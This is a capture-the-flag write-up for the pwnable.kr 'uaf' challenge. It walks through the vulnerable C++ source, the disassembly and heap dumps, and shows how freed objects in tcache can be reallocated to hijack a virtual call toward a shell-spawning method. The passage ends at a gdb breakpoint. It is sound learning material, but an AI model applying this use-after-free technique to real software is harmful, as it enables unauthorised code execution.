# PWNABLE.KR - UAF
_Mommy, what is Use After Free bug?_

In this challenge is covered a basic use-after-free bug.

```c++
#include <fcntl.h>
#include <iostream> 
#include <cstring>
#include <cstdlib>
#include <unistd.h>
using namespace std;

class Human{
private:
	virtual void give_shell(){
		system("/bin/sh");
	}
protected:
	int age;
	string name;
public:
	virtual void introduce(){
		cout << "My name is " << name << endl;
		cout << "I am " << age << " years old" << endl;
	}
};

class Man: public Human{
public:
	Man(string name, int age){
		this->name = name;
		this->age = age;
        }
        virtual void introduce(){
		Human::introduce();
                cout << "I am a nice guy!" << endl;
        }
};

class Woman: public Human{
public:
        Woman(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a cute girl!" << endl;
        }
};

int main(int argc, char* argv[]){
	Human* m = new Man("Jack", 25);
	Human* w = new Woman("Jill", 21);

	size_t len;
	char* data;
	unsigned int op;
	while(1){
		cout << "1. use\n2. after\n3. free\n";
		cin >> op;

		switch(op){
			case 1:
				m->introduce();
				w->introduce();
				break;
			case 2:
				len = atoi(argv[1]);
				data = new char[len];
				read(open(argv[2], O_RDONLY), data, len);
				cout << "your data is allocated" << endl;
				break;
			case 3:
				delete m;
				delete w;
				break;
			default:
				break;
		}
	}

	return 0;	
}
```
Looking at the code it's clear the final goal: call the virtual method **give_shell**.

The method **give_shell** is contained by the class Human that is instanciated 2 times at the start of the binary (m and w). Unfortunately that metho is private and never called...

Executing the binary...

```bash
robi@kaya pwnable.kr/uaf (master*) $ ./uaf 8 ./buffer.txt 
1. use
2. after
3. free
1
My name is Jack
I am 25 years old
I am a nice guy!
My name is Jill
I am 21 years old
I am a cute girl!
1. use
2. after
3. free
3
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
3
free(): double free detected in tcache 2
[1]    7351 abort (core dumped)  ./uaf 8 ./buffer.txt
```


Looking at the assembly code...
```
(gdb) disas main
Dump of assembler code for function main:
   0x0000000000400ec4 <+0>:	push   %rbp
   0x0000000000400ec5 <+1>:	mov    %rsp,%rbp
   0x0000000000400ec8 <+4>:	push   %r12
   0x0000000000400eca <+6>:	push   %rbx
   0x0000000000400ecb <+7>:	sub    $0x50,%rsp
   0x0000000000400ecf <+11>:	mov    %edi,-0x54(%rbp)
   0x0000000000400ed2 <+14>:	mov    %rsi,-0x60(%rbp)
   0x0000000000400ed6 <+18>:	lea    -0x12(%rbp),%rax
   0x0000000000400eda <+22>:	mov    %rax,%rdi
   0x0000000000400edd <+25>:	callq  0x400d70 <_ZNSaIcEC1Ev@plt>
   0x0000000000400ee2 <+30>:	lea    -0x12(%rbp),%rdx
   0x0000000000400ee6 <+34>:	lea    -0x50(%rbp),%rax
   0x0000000000400eea <+38>:	mov    $0x4014f0,%esi
   0x0000000000400eef <+43>:	mov    %rax,%rdi
   0x0000000000400ef2 <+46>:	callq  0x400d10 <_ZNSsC1EPKcRKSaIcE@plt>
   0x0000000000400ef7 <+51>:	lea    -0x50(%rbp),%r12
   0x0000000000400efb <+55>:	mov    $0x18,%edi
   0x0000000000400f00 <+60>:	callq  0x400d90 <_Znwm@plt>
   0x0000000000400f05 <+65>:	mov    %rax,%rbx
   0x0000000000400f08 <+68>:	mov    $0x19,%edx
   0x0000000000400f0d <+73>:	mov    %r12,%rsi
   0x0000000000400f10 <+76>:	mov    %rbx,%rdi
   0x0000000000400f13 <+79>:	callq  0x401264 <_ZN3ManC2ESsi>
   0x0000000000400f18 <+84>:	mov    %rbx,-0x38(%rbp)
   0x0000000000400f1c <+88>:	lea    -0x50(%rbp),%rax
   0x0000000000400f20 <+92>:	mov    %rax,%rdi
   0x0000000000400f23 <+95>:	callq  0x400d00 <_ZNSsD1Ev@plt>
   0x0000000000400f28 <+100>:	lea    -0x12(%rbp),%rax
   0x0000000000400f2c <+104>:	mov    %rax,%rdi
   0x0000000000400f2f <+107>:	callq  0x400d40 <_ZNSaIcED1Ev@plt>
   0x0000000000400f34 <+112>:	lea    -0x11(%rbp),%rax
   0x0000000000400f38 <+116>:	mov    %rax,%rdi
   0x0000000000400f3b <+119>:	callq  0x400d70 <_ZNSaIcEC1Ev@plt>
   0x0000000000400f40 <+124>:	lea    -0x11(%rbp),%rdx
   0x0000000000400f44 <+128>:	lea    -0x40(%rbp),%rax
   0x0000000000400f48 <+132>:	mov    $0x4014f5,%esi
   0x0000000000400f4d <+137>:	mov    %rax,%rdi
   0x0000000000400f50 <+140>:	callq  0x400d10 <_ZNSsC1EPKcRKSaIcE@plt>
   0x0000000000400f55 <+145>:	lea    -0x40(%rbp),%r12
   0x0000000000400f59 <+149>:	mov    $0x18,%edi
   0x0000000000400f5e <+154>:	callq  0x400d90 <_Znwm@plt>
   0x0000000000400f63 <+159>:	mov    %rax,%rbx
   0x0000000000400f66 <+162>:	mov    $0x15,%edx
   0x0000000000400f6b <+167>:	mov    %r12,%rsi
   0x0000000000400f6e <+170>:	mov    %rbx,%rdi
   0x0000000000400f71 <+173>:	callq  0x401308 <_ZN5WomanC2ESsi>
   0x0000000000400f76 <+178>:	mov    %rbx,-0x30(%rbp)
   0x0000000000400f7a <+182>:	lea    -0x40(%rbp),%rax
   0x0000000000400f7e <+186>:	mov    %rax,%rdi
   0x0000000000400f81 <+189>:	callq  0x400d00 <_ZNSsD1Ev@plt>
   0x0000000000400f86 <+194>:	lea    -0x11(%rbp),%rax
   0x0000000000400f8a <+198>:	mov    %rax,%rdi
   0x0000000000400f8d <+201>:	callq  0x400d40 <_ZNSaIcED1Ev@plt>
   0x0000000000400f92 <+206>:	mov    $0x4014fa,%esi
   0x0000000000400f97 <+211>:	mov    $0x602260,%edi
   0x0000000000400f9c <+216>:	callq  0x400cf0 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
   0x0000000000400fa1 <+221>:	lea    -0x18(%rbp),%rax
   0x0000000000400fa5 <+225>:	mov    %rax,%rsi
   0x0000000000400fa8 <+228>:	mov    $0x6020e0,%edi
   0x0000000000400fad <+233>:	callq  0x400dd0 <_ZNSirsERj@plt>
   0x0000000000400fb2 <+238>:	mov    -0x18(%rbp),%eax
   0x0000000000400fb5 <+241>:	cmp    $0x2,%eax
   0x0000000000400fb8 <+244>:	je     0x401000 <main+316>
   0x0000000000400fba <+246>:	cmp    $0x3,%eax
   0x0000000000400fbd <+249>:	je     0x401076 <main+434>
   0x0000000000400fc3 <+255>:	cmp    $0x1,%eax
   0x0000000000400fc6 <+258>:	je     0x400fcd <main+265>
   0x0000000000400fc8 <+260>:	jmpq   0x4010a9 <main+485>
   0x0000000000400fcd <+265>:	mov    -0x38(%rbp),%rax
   0x0000000000400fd1 <+269>:	mov    (%rax),%rax
   0x0000000000400fd4 <+272>:	add    $0x8,%rax
   0x0000000000400fd8 <+276>:	mov    (%rax),%rdx
   0x0000000000400fdb <+279>:	mov    -0x38(%rbp),%rax
   0x0000000000400fdf <+283>:	mov    %rax,%rdi
   0x0000000000400fe2 <+286>:	callq  *%rdx
   0x0000000000400fe4 <+288>:	mov    -0x30(%rbp),%rax
   0x0000000000400fe8 <+292>:	mov    (%rax),%rax
   0x0000000000400feb <+295>:	add    $0x8,%rax
   0x0000000000400fef <+299>:	mov    (%rax),%rdx
   0x0000000000400ff2 <+302>:	mov    -0x30(%rbp),%rax
   0x0000000000400ff6 <+306>:	mov    %rax,%rdi
   0x0000000000400ff9 <+309>:	callq  *%rdx
   0x0000000000400ffb <+311>:	jmpq   0x4010a9 <main+485>
   0x0000000000401000 <+316>:	mov    -0x60(%rbp),%rax
   0x0000000000401004 <+320>:	add    $0x8,%rax
   0x0000000000401008 <+324>:	mov    (%rax),%rax
   0x000000000040100b <+327>:	mov    %rax,%rdi
   0x000000000040100e <+330>:	callq  0x400d20 <atoi@plt>
   0x0000000000401013 <+335>:	cltq   
   0x0000000000401015 <+337>:	mov    %rax,-0x28(%rbp)
   0x0000000000401019 <+341>:	mov    -0x28(%rbp),%rax
   0x000000000040101d <+345>:	mov    %rax,%rdi
   0x0000000000401020 <+348>:	callq  0x400c70 <_Znam@plt>
   0x0000000000401025 <+353>:	mov    %rax,-0x20(%rbp)
   0x0000000000401029 <+357>:	mov    -0x60(%rbp),%rax
   0x000000000040102d <+361>:	add    $0x10,%rax
   0x0000000000401031 <+365>:	mov    (%rax),%rax
   0x0000000000401034 <+368>:	mov    $0x0,%esi
   0x0000000000401039 <+373>:	mov    %rax,%rdi
   0x000000000040103c <+376>:	mov    $0x0,%eax
   0x0000000000401041 <+381>:	callq  0x400dc0 <open@plt>
   0x0000000000401046 <+386>:	mov    -0x28(%rbp),%rdx
   0x000000000040104a <+390>:	mov    -0x20(%rbp),%rcx
   0x000000000040104e <+394>:	mov    %rcx,%rsi
   0x0000000000401051 <+397>:	mov    %eax,%edi
   0x0000000000401053 <+399>:	callq  0x400ca0 <read@plt>
   0x0000000000401058 <+404>:	mov    $0x401513,%esi
   0x000000000040105d <+409>:	mov    $0x602260,%edi
   0x0000000000401062 <+414>:	callq  0x400cf0 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
   0x0000000000401067 <+419>:	mov    $0x400d60,%esi
   0x000000000040106c <+424>:	mov    %rax,%rdi
   0x000000000040106f <+427>:	callq  0x400d50 <_ZNSolsEPFRSoS_E@plt>
   0x0000000000401074 <+432>:	jmp    0x4010a9 <main+485>
   0x0000000000401076 <+434>:	mov    -0x38(%rbp),%rbx
   0x000000000040107a <+438>:	test   %rbx,%rbx
   0x000000000040107d <+441>:	je     0x40108f <main+459>
   0x000000000040107f <+443>:	mov    %rbx,%rdi
   0x0000000000401082 <+446>:	callq  0x40123a <_ZN5HumanD2Ev>
   0x0000000000401087 <+451>:	mov    %rbx,%rdi
   0x000000000040108a <+454>:	callq  0x400c80 <_ZdlPv@plt>
   0x000000000040108f <+459>:	mov    -0x30(%rbp),%rbx
   0x0000000000401093 <+463>:	test   %rbx,%rbx
   0x0000000000401096 <+466>:	je     0x4010a8 <main+484>
   0x0000000000401098 <+468>:	mov    %rbx,%rdi
   0x000000000040109b <+471>:	callq  0x40123a <_ZN5HumanD2Ev>
   0x00000000004010a0 <+476>:	mov    %rbx,%rdi
   0x00000000004010a3 <+479>:	callq  0x400c80 <_ZdlPv@plt>
   0x00000000004010a8 <+484>:	nop
   0x00000000004010a9 <+485>:	jmpq   0x400f92 <main+206>
   0x00000000004010ae <+490>:	mov    %rax,%r12
   0x00000000004010b1 <+493>:	mov    %rbx,%rdi
   0x00000000004010b4 <+496>:	callq  0x400c80 <_ZdlPv@plt>
   0x00000000004010b9 <+501>:	mov    %r12,%rbx
   0x00000000004010bc <+504>:	jmp    0x4010c1 <main+509>
   0x00000000004010be <+506>:	mov    %rax,%rbx
   0x00000000004010c1 <+509>:	lea    -0x50(%rbp),%rax
   0x00000000004010c5 <+513>:	mov    %rax,%rdi
   0x00000000004010c8 <+516>:	callq  0x400d00 <_ZNSsD1Ev@plt>
   0x00000000004010cd <+521>:	jmp    0x4010d2 <main+526>
   0x00000000004010cf <+523>:	mov    %rax,%rbx
   0x00000000004010d2 <+526>:	lea    -0x12(%rbp),%rax
   0x00000000004010d6 <+530>:	mov    %rax,%rdi
   0x00000000004010d9 <+533>:	callq  0x400d40 <_ZNSaIcED1Ev@plt>
   0x00000000004010de <+538>:	mov    %rbx,%rax
   0x00000000004010e1 <+541>:	mov    %rax,%rdi
   0x00000000004010e4 <+544>:	callq  0x400da0 <_Unwind_Resume@plt>
   0x00000000004010e9 <+549>:	mov    %rax,%r12
   0x00000000004010ec <+552>:	mov    %rbx,%rdi
   0x00000000004010ef <+555>:	callq  0x400c80 <_ZdlPv@plt>
   0x00000000004010f4 <+560>:	mov    %r12,%rbx
   0x00000000004010f7 <+563>:	jmp    0x4010fc <main+568>
   0x00000000004010f9 <+565>:	mov    %rax,%rbx
   0x00000000004010fc <+568>:	lea    -0x40(%rbp),%rax
   0x0000000000401100 <+572>:	mov    %rax,%rdi
   0x0000000000401103 <+575>:	callq  0x400d00 <_ZNSsD1Ev@plt>
   0x0000000000401108 <+580>:	jmp    0x40110d <main+585>
   0x000000000040110a <+582>:	mov    %rax,%rbx
   0x000000000040110d <+585>:	lea    -0x11(%rbp),%rax
   0x0000000000401111 <+589>:	mov    %rax,%rdi
   0x0000000000401114 <+592>:	callq  0x400d40 <_ZNSaIcED1Ev@plt>
   0x0000000000401119 <+597>:	mov    %rbx,%rax
   0x000000000040111c <+600>:	mov    %rax,%rdi
   0x000000000040111f <+603>:	callq  0x400da0 <_Unwind_Resume@plt>
End of assembler dump.
```

Given the fact that it's possible to allocate multiple times what we want the plan is clear: corrupt the heap structure and then _press 1_ to call the _introduce()_ corrupted method.

## Exploiting
The 2 instances of the class Human are allocated on the heap. Digging in the assembly code it's possible to determine the size of the allocation:
```
robi@kaya pwnable.kr/uaf (master*) $ r2 uaf 
 -- Mind that the 'g' in radare is silent
[0x00400de0]> aa
[x] Analyze all flags starting with sym. and entry0 (aa)
[0x00400de0]> s main
[0x00400ec4]> pdf
┌ (fcn) main 490
│   int main (int argc, char **argv, char **envp);
│           ; var int32_t var_60h @ rbp-0x60
│           ; var int32_t var_54h @ rbp-0x54
│           ; var int32_t var_50h @ rbp-0x50
│           ; var int32_t var_40h @ rbp-0x40
│           ; var int32_t var_38h @ rbp-0x38
│           ; var int32_t var_30h @ rbp-0x30
│           ; var int32_t var_28h @ rbp-0x28
│           ; var int32_t var_20h @ rbp-0x20
│           ; var int32_t var_18h @ rbp-0x18
│           ; var int32_t var_12h @ rbp-0x12
│           ; var int32_t var_11h @ rbp-0x11
│           ; arg int argc @ rdi
│           ; arg char **argv @ rsi
│           ; DATA XREF from entry0 @ 0x400dfd
│           0x00400ec4      55             push rbp
│           0x00400ec5      4889e5         mov rbp, rsp
│           0x00400ec8      4154           push r12
│           0x00400eca      53             push rbx
│           0x00400ecb      4883ec50       sub rsp, 0x50
│           0x00400ecf      897dac         mov dword [var_54h], edi    ; argc
│           0x00400ed2      488975a0       mov qword [var_60h], rsi    ; argv
│           0x00400ed6      488d45ee       lea rax, [var_12h]
│           0x00400eda      4889c7         mov rdi, rax
│           0x00400edd      e88efeffff     call sym std::allocator<char>::allocator() ; sym.std::allocator_char_::allocator
│           0x00400ee2      488d55ee       lea rdx, [var_12h]
│           0x00400ee6      488d45b0       lea rax, [var_50h]
│           0x00400eea      bef0144000     mov esi, str.Jack           ; 0x4014f0 ; "Jack"
│           0x00400eef      4889c7         mov rdi, rax
│           0x00400ef2      e819feffff     call sym std::basic_string<char, std::char_traits<char>, std::allocator<char> >::basic_string(char const*, std::allocator<char> const&) ; sym.std::basic_string_char__std::char_traits_char___std::allocator_char___::basic_string_char_const___std::allocator_char__const
│           0x00400ef7      4c8d65b0       lea r12, [var_50h]
│           0x00400efb      bf18000000     mov edi, 0x18               ; 24
│           0x00400f00      e88bfeffff     call sym operator new(unsigned long) ; sym.operator_new_unsigned_long
...
```
In particular looking at the address 0x00400efb, it's clear the allocated size is 24 bytes...

Before the free:
```
gef➤  heap chunks
Chunk(addr=0x244d010, size=0x290, flags=PREV_INUSE)
    [0x000000000244d010     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x244d2a0, size=0x11c10, flags=PREV_INUSE)
    [0x000000000244d2a0     00 1c 01 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x245eeb0, size=0x30, flags=PREV_INUSE)
    [0x000000000245eeb0     04 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00    ................]
Chunk(addr=0x245eee0, size=0x20, flags=PREV_INUSE)
    [0x000000000245eee0     70 15 40 00 00 00 00 00 19 00 00 00 00 00 00 00    p.@.............]
Chunk(addr=0x245ef00, size=0x30, flags=PREV_INUSE)
    [0x000000000245ef00     04 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00    ................]
Chunk(addr=0x245ef30, size=0x20, flags=PREV_INUSE)
    [0x000000000245ef30     50 15 40 00 00 00 00 00 15 00 00 00 00 00 00 00    P.@.............]
Chunk(addr=0x245ef50, size=0xf0c0, flags=PREV_INUSE)  ←  top chunk
gef➤  x/10gx 0x244d2a0
0x244d2a0:	0x0000000000011c00	0x0000000000000000
0x244d2b0:	0x0000000000000000	0x0000000000000000
0x244d2c0:	0x0000000000000000	0x0000000000000000
0x244d2d0:	0x0000000000000000	0x0000000000000000
0x244d2e0:	0x0000000000000000	0x0000000000000000
gef➤  x/10gx 0x245eeb0
0x245eeb0:	0x0000000000000004	0x0000000000000004
0x245eec0:	0x0000000000000000	0x000000006b63614a
0x245eed0:	0x0000000000000000	0x0000000000000021
0x245eee0:	0x0000000000401570	0x0000000000000019
0x245eef0:	0x000000000245eec8	0x0000000000000031
gef➤  x/10gx 0x245eee0
0x245eee0:	0x0000000000401570	0x0000000000000019
0x245eef0:	0x000000000245eec8	0x0000000000000031
0x245ef00:	0x0000000000000004	0x0000000000000004
0x245ef10:	0x0000000000000000	0x000000006c6c694a
0x245ef20:	0x0000000000000000	0x0000000000000021
gef➤  x/10gx 0x245ef00
0x245ef00:	0x0000000000000004	0x0000000000000004
0x245ef10:	0x0000000000000000	0x000000006c6c694a
0x245ef20:	0x0000000000000000	0x0000000000000021
0x245ef30:	0x0000000000401550	0x0000000000000015
0x245ef40:	0x000000000245ef18	0x000000000000f0c1
gef➤  x/10gx 0x245ef30
0x245ef30:	0x0000000000401550	0x0000000000000015
0x245ef40:	0x000000000245ef18	0x000000000000f0c1
0x245ef50:	0x0000000000000000	0x0000000000000000
0x245ef60:	0x0000000000000000	0x0000000000000000
0x245ef70:	0x0000000000000000	0x0000000000000000
```
And after the free...

```
robi@kaya pwnable.kr/uaf (master*) $ gef
GEF for linux ready, type `gef' to start, `gef config' to configure
76 commands loaded for GDB 8.3.1 using Python engine 3.7
[*] 4 commands could not be loaded, run `gef missing` to know why.
gef➤  file uaf
Reading symbols from uaf...
(No debugging symbols found in uaf)
gef➤  b *main+216
Breakpoint 1 at 0x400f9c
gef➤  r 8 ./buffer.txt
Starting program: /home/robi/Documents/ulisse_lab/CTFs/pwnable.kr/uaf/uaf 8 ./buffer.txt

Breakpoint 1, 0x0000000000400f9c in main ()
__main__:2458: DeprecationWarning: invalid escape sequence '\$'
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007ffeaa9ed47f  →  0x0000000000000000
$rbx   : 0x000000000086ef30  →  0x0000000000401550  →  0x000000000040117a  →  <Human::give_shell()+0> push rbp
$rcx   : 0x0               
$rdx   : 0x1               
$rsp   : 0x00007ffeaa9ed430  →  0x00007ffeaa9ed578  →  0x00007ffeaa9ee409  →  "/home/robi/Documents/ulisse_lab/CTFs/pwnable.kr/ua[...]"
$rbp   : 0x00007ffeaa9ed490  →  0x00000000004013b0  →  <__libc_csu_init+0> mov QWORD PTR [rsp-0x28], rbp
$rsi   : 0x00000000004014fa  →  "1. use\n2. after\n3. free\n"
$rdi   : 0x0000000000602260  →  0x00007f1fed4c05d0  →  0x00007f1fed40ddc0  →  <std::basic_ostream<char,+0> endbr64 
$rip   : 0x0000000000400f9c  →  <main+216> call 0x400cf0 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
$r8    : 0x000000000086ef30  →  0x0000000000401550  →  0x000000000040117a  →  <Human::give_shell()+0> push rbp
$r9    : 0x00007f1fed4bb0c0  →  0x0000000000602210  →  0x00007f1fed380cd0  →  <__cxxabiv1::__class_type_info::~__class_type_info()+0> endbr64 
$r10   : 0x20              
$r11   : 0x00007f1fed2bea40  →  0x000000000086ef40  →  0x000000000086ef18  →  0x000000006c6c694a ("Jill"?)
$r12   : 0x00007ffeaa9ed450  →  0x000000000086ef18  →  0x000000006c6c694a ("Jill"?)
$r13   : 0x00007ffeaa9ed570  →  0x0000000000000003
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffeaa9ed430│+0x0000: 0x00007ffeaa9ed578  →  0x00007ffeaa9ee409  →  "/home/robi/Documents/ulisse_lab/CTFs/pwnable.kr/ua[...]"	 ← $rsp
0x00007ffeaa9ed438│+0x0008: 0x000000030000ffff
0x00007ffeaa9ed440│+0x0010: 0x000000000086eec8  →  0x000000006b63614a ("Jack"?)
0x00007ffeaa9ed448│+0x0018: 0x0000000000401177  →  <_GLOBAL__sub_I_main+19> pop rbp
0x00007ffeaa9ed450│+0x0020: 0x000000000086ef18  →  0x000000006c6c694a ("Jill"?)	 ← $r12
0x00007ffeaa9ed458│+0x0028: 0x000000000086eee0  →  0x0000000000401570  →  0x000000000040117a  →  <Human::give_shell()+0> push rbp
0x00007ffeaa9ed460│+0x0030: 0x000000000086ef30  →  0x0000000000401550  →  0x000000000040117a  →  <Human::give_shell()+0> push rbp
0x00007ffeaa9ed468│+0x0038: 0x0000000000000000
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400f8d <main+201>       call   0x400d40 <_ZNSaIcED1Ev@plt>
     0x400f92 <main+206>       mov    esi, 0x4014fa
     0x400f97 <main+211>       mov    edi, 0x602260
 →   0x400f9c <main+216>       call   0x400cf0 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
   ↳    0x400cf0 <std::basic_ostream<char,+0> jmp    QWORD PTR [rip+0x20135a]        # 0x602050 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@got.plt>
        0x400cf6 <std::basic_ostream<char,+0> push   0xa
        0x400cfb <std::basic_ostream<char,+0> jmp    0x400c40
        0x400d00 <std::basic_string<char,+0> jmp    QWORD PTR [rip+0x201352]        # 0x602058 <_ZNSsD1Ev@got.plt>
        0x400d06 <std::basic_string<char,+0> push   0xb
        0x400d0b <std::basic_string<char,+0> jmp    0x400c40
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt (
   $rdi = 0x0000000000602260 → 0x00007f1fed4c05d0 → 0x00007f1fed40ddc0 → <std::basic_ostream<char,+0> endbr64 ,
   $rsi = 0x00000000004014fa → "1. use\n2. after\n3. free\n",
   $rdx = 0x0000000000000001
)
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "uaf", stopped 0x400f9c in main (), reason: BREAKPOINT
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400f9c → main()
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  c
Continuing.
1. use
2. after
3. free
3

Breakpoint 1, 0x0000000000400f9c in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x000000000086ef30  →  0x000000000086eee0  →  0x0000000000000000
$rcx   : 0x000000000085d010  →  0x0000000000020002
$rdx   : 0x000000000086eee0  →  0x0000000000000000
$rsp   : 0x00007ffeaa9ed430  →  0x00007ffeaa9ed578  →  0x00007ffeaa9ee409  →  "/home/robi/Documents/ulisse_lab/CTFs/pwnable.kr/ua[...]"
$rbp   : 0x00007ffeaa9ed490  →  0x00000000004013b0  →  <__libc_csu_init+0> mov QWORD PTR [rsp-0x28], rbp
$rsi   : 0x00000000004014fa  →  "1. use\n2. after\n3. free\n"
$rdi   : 0x0000000000602260  →  0x00007f1fed4c05d0  →  0x00007f1fed40ddc0  →  <std::basic_ostream<char,+0> endbr64 
$rip   : 0x0000000000400f9c  →  <main+216> call 0x400cf0 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
$r8    : 0x000000000085d010  →  0x0000000000020002
$r9    : 0x1               
$r10   : 0x0000000000400818  →  0x6c0076506c645a5f ("_ZdlPv"?)
$r11   : 0x00007f1fed380ea0  →  <operator+0> endbr64 
$r12   : 0x00007ffeaa9ed450  →  0x000000000086ef18  →  0x000000006c6c694a ("Jill"?)
$r13   : 0x00007ffeaa9ed570  →  0x0000000000000003
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffeaa9ed430│+0x0000: 0x00007ffeaa9ed578  →  0x00007ffeaa9ee409  →  "/home/robi/Documents/ulisse_lab/CTFs/pwnable.kr/ua[...]"	 ← $rsp
0x00007ffeaa9ed438│+0x0008: 0x000000030000ffff
0x00007ffeaa9ed440│+0x0010: 0x000000000086eec8  →  0x000000006b63614a ("Jack"?)
0x00007ffeaa9ed448│+0x0018: 0x0000000000401177  →  <_GLOBAL__sub_I_main+19> pop rbp
0x00007ffeaa9ed450│+0x0020: 0x000000000086ef18  →  0x000000006c6c694a ("Jill"?)	 ← $r12
0x00007ffeaa9ed458│+0x0028: 0x000000000086eee0  →  0x0000000000000000
0x00007ffeaa9ed460│+0x0030: 0x000000000086ef30  →  0x000000000086eee0  →  0x0000000000000000
0x00007ffeaa9ed468│+0x0038: 0x0000000000000000
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400f8d <main+201>       call   0x400d40 <_ZNSaIcED1Ev@plt>
     0x400f92 <main+206>       mov    esi, 0x4014fa
     0x400f97 <main+211>       mov    edi, 0x602260
 →   0x400f9c <main+216>       call   0x400cf0 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
   ↳    0x400cf0 <std::basic_ostream<char,+0> jmp    QWORD PTR [rip+0x20135a]        # 0x602050 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@got.plt>
        0x400cf6 <std::basic_ostream<char,+0> push   0xa
        0x400cfb <std::basic_ostream<char,+0> jmp    0x400c40
        0x400d00 <std::basic_string<char,+0> jmp    QWORD PTR [rip+0x201352]        # 0x602058 <_ZNSsD1Ev@got.plt>
        0x400d06 <std::basic_string<char,+0> push   0xb
        0x400d0b <std::basic_string<char,+0> jmp    0x400c40
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt (
   $rdi = 0x0000000000602260 → 0x00007f1fed4c05d0 → 0x00007f1fed40ddc0 → <std::basic_ostream<char,+0> endbr64 ,
   $rsi = 0x00000000004014fa → "1. use\n2. after\n3. free\n",
   $rdx = 0x000000000086eee0 → 0x0000000000000000
)
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "uaf", stopped 0x400f9c in main (), reason: BREAKPOINT
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400f9c → main()
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  heap bins
──────────────────────────────────────────────────────────────────── Tcachebins for arena 0x7f1fed2be9e0 ────────────────────────────────────────────────────────────────────
Tcachebins[idx=8, size=0x90] count=0  ←  Chunk(addr=0x86ef30, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x86eee0, size=0x20, flags=PREV_INUSE) 
Tcachebins[idx=9, size=0xa0] count=0  ←  Chunk(addr=0x86ef00, size=0x30, flags=PREV_INUSE)  ←  Chunk(addr=0x86eeb0, size=0x30, flags=PREV_INUSE) 
───────────────────────────────────────────────────────────────────── Fastbins for arena 0x7f1fed2be9e0 ─────────────────────────────────────────────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
──────────────────────────────────────────────────────────────────── Unsorted Bin for arena 'main_arena' ────────────────────────────────────────────────────────────────────
[+] Found 0 chunks in unsorted bin.
───────────────────────────────────────────────────────────────────── Small Bins for arena 'main_arena' ─────────────────────────────────────────────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
───────────────────────────────────────────────────────────────────── Large Bins for arena 'main_arena' ─────────────────────────────────────────────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤
```
So after the free (given the size of 24 bytes) the two instances of the class (m and w) will be moved into the Tcache.

Now, when we allocate new memory (< of 24 bytes), it will be allocated on the Tcache bins and given the fact that we can call the method introduce, even if there is no instance, we have a UAF bug.

The method _introduce()_ is called at main+286 (_call rdx_):
```
   0x0000000000400fcd <+265>:	mov    -0x38(%rbp),%rax
   0x0000000000400fd1 <+269>:	mov    (%rax),%rax
   0x0000000000400fd4 <+272>:	add    $0x8,%rax
   0x0000000000400fd8 <+276>:	mov    (%rax),%rdx
   0x0000000000400fdb <+279>:	mov    -0x38(%rbp),%rax
   0x0000000000400fdf <+283>:	mov    %rax,%rdi
   0x0000000000400fe2 <+286>:	callq  *%rdx
```
Debugging:
```
gdb-peda$ 
gdb-peda$ b *main+286
